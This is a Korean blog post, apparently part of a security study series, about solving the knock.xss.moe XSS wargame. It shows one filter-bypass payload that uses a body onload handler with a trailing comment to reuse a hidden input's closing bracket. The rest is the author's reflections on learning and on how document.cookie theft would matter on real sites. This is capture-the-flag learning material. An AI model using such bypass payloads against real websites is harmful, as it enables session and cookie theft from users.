**Payload 0x01** 지금 `hidden`가 사용되고 있어서 어떻게 할까 고민하다가…
페이지가 열릴 때마다 스크립트를 실행시키도록 하고 싶었다!

그래서 새롭게 진입하든, 뒤로가기로 진입하든 항상 이벤트를 발생시키는
body pageshow event를 사용해서 스크립트를 실행시키기로 했다!

body pageshow event 예시 중 `<body onload="myonload()" onpageshow="mypageshowcode()">`를 스크립트에 넣을겁니다!

> [body pageshow event](https://developer.mozilla.org/en-US/docs/Web/Events/pageshow)

그리고, `<`은 필터링이 안되니까 `<input type=hidden>`의 `>`를 사용하기 위해 뒤에 주석처리를 할 수 있습니다.

```
<body / onload=alert(1);//>
```

이렇게 보내게 되면

```
<body onload="alert(1); // <input"type = "hidden"> </body>
```

이렇게 reponse가 옵니다! 이렇게 성공시킬 수 있습니다!



뭔가 1번부터 열심히 달려왔는데 마지막에 이렇게 중복답안이 있으니 뭔가 허무하지 않나요…

그래서 지난번동안은 앞만 보고 달려왔다면, 이번에는 xss에는 답이 없다는 것을 보여드리고 싶었습니다.

xss가 아직도 살아있는 이유가 진짜 할 수 있는 방법은 여러가지고, 하나의 방법만 있는게 아니라 우회를 해야 되는 방법을 알고나면 정답은 여러가지인 재미있는 공격방식이기 때문입니다.



------



## 2. 일기 훔쳐보기

#### XSS 5일째 <날씨: 비옴 기분: 꿀꿀함>

`<주의>` 저 또한 뉴비들과 비슷한 수준이고, 이는 가르치려는 내용이 아니라 내가 느꼈던 것을 끄적어둔 것!



![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/webtour05_4.png)



대학을 다니면서 이론으로만 공부하는게 얼마나 위험하고, 시간을 아껴쓰지 못한 공부법인지 알게 되었던 시간이었다.

이걸 해보지 못하고, 개발자 중에 xss를 못 막는 개발자는 일을 안하는 개발자라는 글을 본 적이 있다.
그리고 나는 그런가보다라는 생각을 했었다. 내 손으로 실습해보고 구현해본거 아니면 다른 사람 말을 믿고 그게 정답이라는 생각을 가지지 말자는 생각을 하게 되었다.

`knock.xss.moe xss wargame` 풀면서 `cheatsheet`에 있는 스크립트를 보고, js함수를 알아가며 xss가 왜 지금까지도 안 없어진지에 대해서 느낄 수 있었던 시간이었다.
사람이 만든 코딩인지라 진짜 어떻게든 허점이 있다.
~~그게 굳이 xss가 아니더라도..~~



`docment.cookie`로 FLAG를 가지고 오는 것을 몇 십번씩 반복하면서 FLAG내용이 아니라 실제 사이트의 쿠키라면 해킹의 좋은 발판을 마련해주게 됨을 생각하게 된다.

web 어플리케이션을 사용할 때, 쿠키를 이용하여 사용자는 기본 설정, 사용자의 이름, 서버시를 저장할 수 있습니다. 그래서 Micrisoft에서는 쿠키를 사용자의 `신분증`이라고 표현하고 있기 때문에 비유를 하자면 내가 다른 사람의 신분증을 훔쳐볼 수 있게 되는 좋은 기회이지 않은가!

보안을 하기 위해서라면 해킹을 하는 법에 대해서 알아야 확실히 대처할 수 있다는 생각하기 때문에 그런면에서 knock.xss.moe은 시스템 구현도 잘 해놨고, 어떻게 우회해야 될지 고민할 수 있는 좋은 입문자용 wargame 사이트라고 생각했다.

~~제가 풀어본 wargame사이트가 많지는 않습니다ㅠ~~

그리고 두번째 느낀 것은 **많은 것을 봐야 시야가 넓어짐을 알게 되었습니다.**

확실히 문제를 풀면서 보이는게 많아지고, `knock.xss.moe` 문제풀이를 보면 하나하나 깨달아가는데, 그 때문에 확실히 보이는게 많아지고 어떻게 풀어야겠구나를 느끼게 되는 것 같습니다. 이 wargame 하나 푸는데도 그러는데 다른 wargame, ctf 문제 풀이하면서는 얼마나 발전하게 될까 두근두근 되는 느낌을 받기도 합니다.

```
문제 안 풀려서 찡찡되고 있었는데 다른 분은 내가 며칠동안 잡고 있던 문제를 올클까지 30분도 안 걸렸다는...
```

그래서 아 나 진짜 바본가 생각했는데, 다른 사람이랑 비교하지말고 내가 성장하는거에 초점을 맞춰야지 언제까지 비교만 하다가 이세상 뜰거같다는 생각이 듦…허헣



![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/webtour05_1.png)



wargame 사이트와 ctf를 많이 풀어볼거에요!

*나 스포하는거임. 이론 별로 없을거고 문제만 잔뜩 풀고 이론 확인하는방식으로 진행할거에요!*

그런 노가다와 경험을 많이 쌓기 위해서는 목표가 정말 중요함을 느끼게 되었습니다.

`knock.xss.moe` 올클이라는 목표가 없었으면 그냥 때려쳤을거야.

그리고 응원해주는 멘토이자 삼촌 없었으면 진짜 때려쳤을듯!

문제를 풀다가 왜 내가 이 문제를 풀고 있는가? 무슨 의미가 있지… 이걸 하는 것보다 코딩공부를 하는 게 조금 더 낫지 않을까?

별 생각을 다 했던거같아요!

그리고 인생사 살다보면 무슨일이 생기지 않습니까!

그러면 공부도 하기싫고 머리도 안 굴러가고 나는 바보인데 내 머리로는 못 푸는 것이 아닌가 한탄도 하고, 이것도 못 풀면 보안을 그만둬야 혼자 고민하고,



![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/webtour05_3.png)



저는 인맥도 좁아서 보안하는 친구밖에 없는데! 그것도 못 푸냐고 그래서 아득바득 또 열심히 풀고!

막상 처음에 목표했던대로 클리어하니까 `그래도 할 수 있나?` 라는 생각도 들고!

역시 세상 단순~!ㅋㅋㅋㅋㅋ



![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/webtour05_2.png)



XSS 다음에는 `sql injection`을 할 예정인데 이렇게 고민했던 내용은 이번에 처음이자 마지막으로 쓸 예정입니다.

이 글을 쓰고자 했던 이유가 뉴비들과 같이 `잘` 하는 사람으로 성장하고 싶다. 라는 취지에서 출발한 글이니까 나같은 바보도 올클했는데 님들도 다 할 수 있어요!

```
내가 열심히 했으면 하고, 같이 포기하지 않았으면 해서 적어봤습니다!
```

------



#### 오늘은 여기까지!

```
아직 XSS 안 끝났습니다!
다음은 대응방안에 대해서 재미나게 구성해보도록 오겠습니다! 슝슝
```